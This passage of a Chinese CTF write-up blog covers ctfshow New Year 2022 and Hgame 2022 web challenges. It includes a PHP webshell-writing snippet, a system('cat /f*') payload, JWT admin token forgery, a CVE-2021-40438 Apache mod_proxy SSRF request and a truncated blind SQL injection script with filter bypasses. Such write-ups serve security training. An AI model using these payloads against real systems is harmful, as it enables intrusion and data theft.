class="line"><span class="keyword">if</span>(count(<span class="variable">$_POST</span>)===<span class="number">1</span>)&#123;</span><br><span class="line">        extract(<span class="variable">$_POST</span>);</span><br><span class="line">        <span class="keyword">if</span> (call_user_func($$$$$$&#123;key(<span class="variable">$_POST</span>)&#125;)===<span class="string">&quot;HappyNewYear&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>利用session修改变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Body</span><br><span class="line">session_id=session_id</span><br><span class="line">Cookie</span><br><span class="line">PHPSESSID=HappyNewYear</span><br></pre></td></tr></table></figure>

<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-01-16 15:42:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-01-24 22:14:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$key</span>=  call_user_func((<span class="variable">$_GET</span>[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span>==<span class="string">&quot;HappyNewYear&quot;</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;虎年大吉，新春快乐！&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>弱类型比较，布尔值和任意字符串弱相等</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=session_start</span><br><span class="line"><span class="number">1</span>=json_last_error</span><br></pre></td></tr></table></figure>

<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-01-16 15:42:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-01-24 22:14:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span>=  call_user_func((<span class="variable">$_GET</span>[<span class="number">1</span>]));</span><br><span class="line">file_put_contents(<span class="variable">$key</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;虎年大吉，新春快乐！&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>需要写入一句话木马，那么$key的值应该为php后缀文件<br>寻找调用返回php后缀的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>= spl_autoload_extensions</span><br><span class="line"><span class="comment">//之后进入.inc,.php</span></span><br><span class="line"><span class="number">1</span>=system(<span class="string">&quot;cat /f*&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>预期解为发送超长字符致使php内存溢出，非预期是竞争。<br>发送大量的hu即可通过替换实现内存占用放大，超过php最大默认内存256M即可造成变量定义失败，出现致命错误从而跳过后面的覆盖写入。<br>一个 hu 替换128 kB<br>准确计算： 256 * 1024 *1024 / 128 / 1024 = 2097152 个，用python生成下即可<br>发送过多服务器会报错o(╥﹏╥)o<br>用burp传进去，然后访问 /🐯 下载文件即可得到flag</p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>之后的不太会，看大佬博客<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Little_jcak/article/details/122819006">大佬博客</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/18/Hello%20Hgame%202022/">Hgame 2022</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-18</time><div class="content"><h2 id="web蛛蛛…嘿嘿♥我的蛛蛛"><a href="#web蛛蛛…嘿嘿♥我的蛛蛛" class="headerlink" title="web蛛蛛…嘿嘿♥我的蛛蛛"></a>web蛛蛛…嘿嘿♥我的蛛蛛</h2><p>本题进入题目后，根据题目到达第100关，对提示进行抓包，在回复中得到flag</p>
<h2 id="webTetris-plus"><a href="#webTetris-plus" class="headerlink" title="webTetris plus"></a>webTetris plus</h2><p>本题打开页面，是个游戏，可以F12，之后搜索alert<br><img src="https://img-blog.csdnimg.cn/1619019c2f56423c8da4ccae96940cc8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在check.js中的alert下面有jsfuck加密<br>在控制台上解密得到flag</p>
<h2 id="webeasy-auth"><a href="#webeasy-auth" class="headerlink" title="webeasy_auth"></a>webeasy_auth</h2><p>标题auth提示是鉴权方面的问题，描述中的“没有调试完”说明存在弱密码之类的问问题。问题出在前后后端交互的token中<br>首先正常注册并登录自己的账号，获得自己的token<br><img src="https://img-blog.csdnimg.cn/0fbc2d34a505494eb3801db04b9686f9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>前往jwt解析工具进行解析，，对taken进行jwt解密<br><img src="https://img-blog.csdnimg.cn/f5f5b153050543639143c42b7c54f407.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后将id和token进行修改，改为1和admin<br><img src="https://img-blog.csdnimg.cn/7d02c9a493cf4acf8cd2af66923a7ae4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>放入本地存储空间，修改后刷新得到flag<br><img src="https://img-blog.csdnimg.cn/5e33cf3d0f1943c0aa9632ee167c4de3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="misc好康的流量"><a href="#misc好康的流量" class="headerlink" title="misc好康的流量"></a>misc好康的流量</h2><p>附件为wireshark流量文件<br>大概能看出流量内容为一封邮件<br>使用wireshark的 导出SMB对象 即可导出邮件内容<br>PS：部分wireshark因为版本问题无法识别 使用追踪tcp流 然后base64解码 获得邮件内容<br>结合邮件中的LSB内容<br>判断是LSB隐写<br>扫描得到前半段flag<br><img src="https://img-blog.csdnimg.cn/6cb68965309f4155be7d4e2ff768c4e3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得后半段<br><img src="https://img-blog.csdnimg.cn/3818672e03194c17a9f7dcda31c2df0f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="webpack-engine"><a href="#webpack-engine" class="headerlink" title="webpack-engine"></a>webpack-engine</h2><p>看源码<br><img src="https://img-blog.csdnimg.cn/8f3aea5f37794c06a1bf19699556d41e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="web-Apache"><a href="#web-Apache" class="headerlink" title="web Apache!"></a>web Apache!</h2><p>打开题目看源码发现附件<br>在Default.conf发现flag路径<br><img src="https://img-blog.csdnimg.cn/5f26a67b06754c38ae817ebed19c5591.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>本题考查CVE-2021-40438 Apache mod_proxy SSRF 漏洞<br>看详细资料<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/263175#h2-0">CVE-2021-40438 Apache mod_proxy SSRF 漏洞分析</a><br><a target="_blank" rel="noopener" href="https://firzen.de/building-a-poc-for-cve-2021-40438">为 CVE-2021-40438 构建 POC</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/257657">Apache httpd Server CVE-2021-40438 漏洞分析</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html">Apache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸</a><br>从而得到路径</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /proxy?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http:<span class="comment">//127.0.0.1:60010/flag HTTP/1.1</span></span><br></pre></td></tr></table></figure>
<p>（由于我写的是都服务器似乎关闭了，因此没有得到flag）</p>
<h2 id="web-Pokemon"><a href="#web-Pokemon" class="headerlink" title="web Pokemon"></a>web Pokemon</h2><p>本题考查sql注入中的二分法盲注<br>过滤=用like绕过<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39557087/article/details/113441010">mysql 注释 绕过_SQL注入绕过方法</a><br>poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://121.43.141.153:60056/error.php?code=&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (head &lt; tail):</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr(database(),%d,1))&gt;%d,404,403)&quot; % (i , mid)</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((selselectect/*/**/*/flag/*/**/*/frfromom/*/**/*/fllllllllaaaaaag),%d,1))&gt;%d,404,403)&quot;</span> % (i, mid)</span><br><span class="line">        <span class="comment">#payload = 